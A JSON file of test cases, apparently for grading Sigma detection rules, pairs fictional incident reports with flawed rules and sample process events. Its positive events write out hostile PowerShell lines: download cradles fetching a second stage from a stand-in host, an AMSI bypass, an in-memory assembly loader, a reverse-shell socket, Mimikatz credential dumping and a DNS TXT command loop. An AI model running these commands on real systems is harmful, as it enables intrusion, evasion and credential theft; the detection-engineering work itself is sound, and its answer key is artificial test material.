@@ -1,0 +1,484 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"(New-Object Net.WebClient).DownloadString('https://repo.corp.example/modules/index.txt')\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-carol"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c start powershell",
+      "user": "LAB\\svc-freight"
+     },
+     {
+      "cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"$w = New-Object Net.WebClient; IEX $w.DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "user": "LAB\\svc-freight"
+     }
+    ]
+   },
+   "evidence": [
+    "IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')",
+    "The decoded script block was a classic download cradle: it built a Net.WebClient object, called DownloadString against a staging server and piped the result straight into Invoke-Expression."
+   ],
+   "expected_gate": "G6",
+   "id": "D5-01",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "During the intrusion at a regional freight broker, the operator launched PowerShell with an encoded command, so the process command line showed only an opaque Base64 string. The analyst team enabled PowerShell script block logging on the affected servers and recovered the decoded body from event 4104. The decoded script block was a classic download cradle: it built a Net.WebClient object, called DownloadString against a staging server and piped the result straight into Invoke-Expression. The recovered text read: IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1'). The staging host cdn-assets.glasswharf.example served only a second-stage loader and was registered two days before the intrusion. We assess the cradle as the first hands-on-keyboard action after initial access, and the only place it is visible in cleartext is the script block log, because the command line itself was encoded.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Script Block Download Cradle From Staging Host\nid: 3f6a1c52-8e47-4b0d-9a21-5c7d0e1f4a01\nstatus: experimental\ndescription: Detects a decoded PowerShell script block that fetches a second stage with Net.WebClient DownloadString from the staging host named in the report.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: ps_script\n  product: windows\ndetection:\n  selection:\n    ScriptBlockText|contains|all:\n      - Net.WebClient\n      - DownloadString\n      - cdn-assets.glasswharf.example\n  condition: selection\nfalsepositives:\n  - Administrator scripts that download modules from the same host during an approved change\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001",
+    "T1105"
+   ],
+   "why": "The rule's only discriminating field is ScriptBlockText on a PowerShell script block log source (event 4104), and the laboratory catalog marks windows_powershell_script_block as available: false, so the rule cannot fire on any telemetry the laboratory collects. Everything else (metadata, tags, evidence-backed values) is valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | Out-Null\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\sec-frank"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\erin"
+     },
+     {
+      "cmd": "cmd.exe /c dir C:\\Users\\erin\\Documents",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\erin"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\fin-dave"
+     },
+     {
+      "cmd": "powershell.exe -nop -c \"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\fin-dave"
+     }
+    ]
+   },
+   "evidence": [
+    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+   ],
+   "expected_gate": "G6",
+   "id": "D5-02",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "Incident responders investigating a compromised finance workstation found that the intruder disabled the Antimalware Scan Interface before running anything noisy. The activity was invisible in process telemetry because the bypass ran inside an already-running PowerShell session. PowerShell script block logging (event 4104) preserved the one-line bypass, which uses reflection to flip an internal flag in the AMSI utility class. The recovered line was: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). After this line executed, later script blocks containing known offensive tooling were no longer submitted to the antimalware provider. We saw the same line, byte for byte, on three hosts, which suggests a shared operator playbook. Because the string lives only inside the script block, command-line and image-load telemetry gave no indication that AMSI had been tampered with.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell AMSI Bypass Via AmsiUtils amsiInitFailed Reflection\nid: 7b2d9e14-2c35-4f68-b1a7-8d03e6c59f12\nstatus: experimental\ndescription: Detects a PowerShell script block that sets the amsiInitFailed field of the AmsiUtils class through reflection to disable AMSI scanning.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1562.001\nlogsource:\n  category: ps_script\n  product: windows\ndetection:\n  selection:\n    ScriptBlockText|contains|all:\n      - AmsiUtils\n      - amsiInitFailed\n  condition: selection\nfalsepositives:\n  - Security research scripts executed on a lab host by the security team\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1562.001"
+   ],
+   "why": "The detection depends solely on ScriptBlockText from PowerShell script block logging (event 4104), a source the laboratory catalog marks available: false; with that telemetry absent the rule has no data to evaluate and can never alert in this laboratory."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"$cfg = Get-Content C:\\Config\\settings.b64; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfg))\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-henry"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\grace"
+     },
+     {
+      "cmd": "ping.exe printer01.corp.example",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\grace"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"[Reflection.Assembly]::Load([Convert]::FromBase64String($payload))\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c start powershell",
+      "user": "LAB\\front-desk"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c \"$payload=(Get-Content C:\\ProgramData\\blob.txt); [Reflection.Assembly]::Load([Convert]::FromBase64String($payload)).GetType('Loader.Main').GetMethod('Run').Invoke($null,$null)\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\ProgramData\\run.vbs",
+      "user": "LAB\\front-desk"
+     }
+    ]
+   },
+   "evidence": [
+    "[Reflection.Assembly]::Load([Convert]::FromBase64String($payload))",
+    "The host process in every case was powershell.exe."
+   ],
+   "expected_gate": "G6",
+   "id": "D5-03",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "A hospitality-sector intrusion set used a PowerShell loader that never wrote a payload to disk. The launcher was a long encoded command, so process records contained only powershell.exe and a Base64 blob. Script block logging on the one host where it happened to be enabled (event 4104) exposed the decoded stage: the script decoded a second Base64 buffer and loaded it into memory as a .NET assembly. The decoded text included the line [Reflection.Assembly]::Load([Convert]::FromBase64String($payload)) followed by a call to the loaded type's entry method. This in-memory load is why file-based scanning missed the implant. We recommend detection on the decoded script content rather than on the encoded launcher, since the encoded launcher differs on every host while the decoded loader line is stable across the victims we examined. The host process in every case was powershell.exe.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell In-Memory Assembly Load From Base64 Buffer\nid: c1e84a76-5d90-4a3b-8f2e-12b7a9d0c633\nstatus: experimental\ndescription: Detects powershell.exe running a script that loads a Base64-decoded buffer as a .NET assembly in memory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.stealth\n  - attack.t1027\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_host:\n    Image|endswith: '\\powershell.exe'\n  selection_loader:\n    ScriptBlockText|contains|all:\n      - '[Reflection.Assembly]::Load'\n      - 'FromBase64String'\n  condition: selection_host and selection_loader\nfalsepositives:\n  - Administrative tooling that loads assemblies from encoded configuration data\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "why": "The rule declares the available category process_creation and filters on Image, but its only discriminating condition is on ScriptBlockText, a field that exists only in the PowerShell script block log (windows_powershell_script_block, available: false); the opportunity requires that unavailable source, so the rule cannot detect the in-memory load in the laboratory's telemetry."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"$c = New-Object System.Net.Sockets.TCPClient('192.0.2.15',443); $c.Close()\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\netops-judy"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\ivan"
+     },
+     {
+      "cmd": "notepad.exe build-notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\ivan"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444); $stream = $client.GetStream()\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\build-svc"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444); while($true){Start-Sleep 5}\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "user": "LAB\\build-svc"
+     }
+    ]
+   },
+   "evidence": [
+    "$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444)",
+    "The relay at 203.0.113.77 listened on TCP 4444, a non-standard port for this environment"
+   ],
+   "expected_gate": "G6",
+   "id": "D5-04",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "Our incident response team reconstructed an interactive PowerShell reverse shell on a developer build server. The initial command line was wrapped in an encoded command, but script block logging (event 4104) captured the decoded socket code. The script opened a raw TCP socket to the operator's relay and wrapped the stream in a reader and writer loop. The key line read: $client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444). The relay at 203.0.113.77 listened on TCP 4444, a non-standard port for this environment, and answered every session with a simple prompt string. The operator ran host discovery and then pulled additional tooling through the same channel. Because the destination and port were assembled inside the script, the decoded script block is the most reliable place to see the relay address, ahead of any network-layer record.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Reverse Shell Using TCPClient To Known Relay\nid: 9a05f3d8-61b2-4e7c-a4d9-0f58b2e71c44\nstatus: experimental\ndescription: Detects an outbound connection from a PowerShell reverse shell that builds a System.Net.Sockets.TCPClient to the relay address named in the report.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection_net:\n    Initiated: true\n  selection_script:\n    ScriptBlockText|contains|all:\n      - System.Net.Sockets.TCPClient\n      - '203.0.113.77'\n  condition: selection_net and selection_script\nfalsepositives:\n  - Network diagnostic scripts that test connectivity to the same relay address\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1059.001",
+    "T1571"
+   ],
+   "why": "The rule claims the available category network_connection and adds only the boolean Initiated field, but its sole discriminating condition is ScriptBlockText, which is produced only by PowerShell script block logging (windows_powershell_script_block, available: false); the opportunity requires that source, so the rule cannot work on the laboratory's network telemetry."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"Get-Process lsass | Select-Object Id, Name\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-leo"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "svchost.exe -k netsvcs -p",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\services.exe",
+      "parent_cmd": "C:\\Windows\\System32\\services.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "cmd.exe /c dir D:\\Shares",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\kate"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -nop -c \"Invoke-Mimikatz -DumpCreds\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-files"
+     },
+     {
+      "cmd": "powershell.exe -nop -c \"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc-files"
+     }
+    ]
+   },
+   "evidence": [
+    "the decoded script contained the function name Invoke-Mimikatz and the argument -DumpCreds, together with the module command sekurlsa::logonpasswords"
+   ],
+   "expected_gate": "G6",
+   "id": "D5-05",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "A ransomware affiliate dumped credentials on a domain-joined file server without dropping any binary. The operator pulled a PowerShell port of a well-known credential dumping tool into memory and called it directly. Because the tool was loaded from a remote string, the process command line only showed a short launcher. The analyst recovered the real activity from PowerShell script block logging (event 4104), where the decoded script contained the function name Invoke-Mimikatz and the argument -DumpCreds, together with the module command sekurlsa::logonpasswords. These strings appeared in a single script block of roughly 1.2 MB, which is typical of the embedded reflective payload. Access to the LSASS process was then used to obtain plaintext and hashed credentials of two domain administrators. Defenders should therefore alert on the decoded script block rather than on the launcher.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Invoke-Mimikatz Credential Dumping In Script Block\nid: e47b6c20-93af-4d15-86c0-a3d2f91e5b55\nstatus: experimental\ndescription: Detects a PowerShell script block that contains the Invoke-Mimikatz function with the DumpCreds argument or the sekurlsa logonpasswords module command.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003.001\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  product: windows\n  service: powershell\ndetection:\n  selection_function:\n    ScriptBlockText|contains|all:\n      - Invoke-Mimikatz\n      - '-DumpCreds'\n  selection_module:\n    ScriptBlockText|contains: 'sekurlsa::logonpasswords'\n  condition: selection_function or selection_module\nfalsepositives:\n  - Authorised red team exercises that run Mimikatz from PowerShell\nlevel: critical\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1003.001",
+    "T1059.001"
+   ],
+   "why": "The rule matches only on ScriptBlockText for a PowerShell service log source, which is the script block log (event 4104); the laboratory catalog marks windows_powershell_script_block as available: false, so the rule cannot fire in this laboratory."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"Resolve-DnsName -Type TXT -Name _dmarc.mail.example\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\mailadmin-olga"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "whoami /all",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\noah"
+     },
+     {
+      "cmd": "ping.exe fileserver01.corp.example",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\noah"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\dev-mia"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c \"while($true){$r = Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid'); Start-Sleep 90}\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe C:\\Users\\Public\\sync.vbs",
+      "user": "LAB\\dev-mia"
+     }
+    ]
+   },
+   "evidence": [
+    "Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid')",
+    "it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid"
+   ],
+   "expected_gate": "G6",
+   "id": "D5-06",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "A threat actor targeting a logistics software vendor used DNS TXT records as a low-bandwidth command channel from PowerShell. The launcher was heavily obfuscated and the process command line did not expose the domain. With script block logging (event 4104) enabled, the decoded loop was visible: it called Resolve-DnsName with the TXT record type against a per-victim subdomain of beacon-relay.invalid, decoded the returned string and passed it to Invoke-Expression. The recovered fragment was: Resolve-DnsName -Type TXT -Name ($hostId + '.beacon-relay.invalid'). Polling occurred about every 90 seconds. We note that the DNS responses were short Base64 strings, which kept each exchange small enough to blend into normal resolver traffic. The reliable indicator is the script text itself, because the query name varies with the victim identifier prefix.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell DNS TXT Command Channel To Beacon Relay Domain\nid: 52d8a9f1-0b7e-4c63-9e84-6a1c3f7d2b66\nstatus: experimental\ndescription: Detects a PowerShell session that polls TXT records on the relay domain named in the report using Resolve-DnsName.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\n  - attack.execution\n  - attack.t1059.001\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    ScriptBlockText|contains|all:\n      - Resolve-DnsName\n      - '-Type TXT'\n      - 'beacon-relay.invalid'\n  condition: selection\nfalsepositives:\n  - Administrators validating TXT records for the relay domain during a change\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004",
+    "T1059.001"
+   ],
+   "why": "The rule claims the available category dns_query, yet it contains no condition on QueryName or Image; its only discriminating field is ScriptBlockText, which exists only in the PowerShell script block log (windows_powershell_script_block, available: false), and the opportunity requires that source."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D5",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"Register-ScheduledTask -TaskName 'NightlyBackupCheck' -Action $action -Trigger $trigger\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\admin-quinn"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "schtasks.exe /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\pat"
+     },
+     {
+      "cmd": "calc.exe",
+      "image": "C:\\Windows\\System32\\calc.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\pat"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command \"Register-ScheduledTask -TaskName 'WinSyncHelper' -Action $action -Trigger $trigger -RunLevel Highest\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\plant-ops"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c \"$t = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'WinSyncHelper' -Action $action -Trigger $t -RunLevel Highest\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "user": "LAB\\plant-ops"
+     }
+    ]
+   },
+   "evidence": [
+    "Register-ScheduledTask -TaskName 'WinSyncHelper' -Action $action -Trigger $trigger -RunLevel Highest",
+    "The session host was powershell.exe (OriginalFileName PowerShell.EXE) in all cases we observed."
+   ],
+   "expected_gate": "G6",
+   "id": "D5-07",
+   "logsource": "windows_powershell_script_block",
+   "report_text": "During a manufacturing-sector investigation the actor established persistence by registering a scheduled task from inside a PowerShell session, rather than by running schtasks.exe. Process telemetry therefore showed no child process for the task creation. The decoded script block, recovered from event 4104, used the ScheduledTasks module cmdlets. The key line was: Register-ScheduledTask -TaskName 'WinSyncHelper' -Action $action -Trigger $trigger -RunLevel Highest. The action ran a PowerShell one-liner from the ProgramData directory at every logon. The task name was chosen to resemble a Windows component, but it was absent from clean baseline images. Hunters should look for the cmdlet together with the task name inside script content, because the task registration was performed by a library call in-process. The session host was powershell.exe (OriginalFileName PowerShell.EXE) in all cases we observed.",
+   "role": "defective",
+   "sigma_yaml": "title: PowerShell Scheduled Task Persistence Named WinSyncHelper\nid: b86f0e3a-d412-47a9-a5c1-90e7d4b38f77\nstatus: experimental\ndescription: Detects a PowerShell session that registers the scheduled task WinSyncHelper with the Register-ScheduledTask cmdlet.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\n  - attack.t1059.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_host:\n    OriginalFileName: 'PowerShell.EXE'\n  selection_task:\n    ScriptBlockText|contains|all:\n      - Register-ScheduledTask\n      - WinSyncHelper\n  condition: selection_host and selection_task\nfalsepositives:\n  - Administrators creating a task with the same name during an approved deployment\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005",
+    "T1059.001"
+   ],
+   "why": "The rule declares the available category process_creation and filters on OriginalFileName, but its only discriminating condition is on ScriptBlockText, which exists only in the PowerShell script block log (windows_powershell_script_block, available: false); the task registration happens in-process via a cmdlet, so no process telemetry carries the cmdlet text and the rule cannot fire in this laboratory."
+  }
+ ]
+}
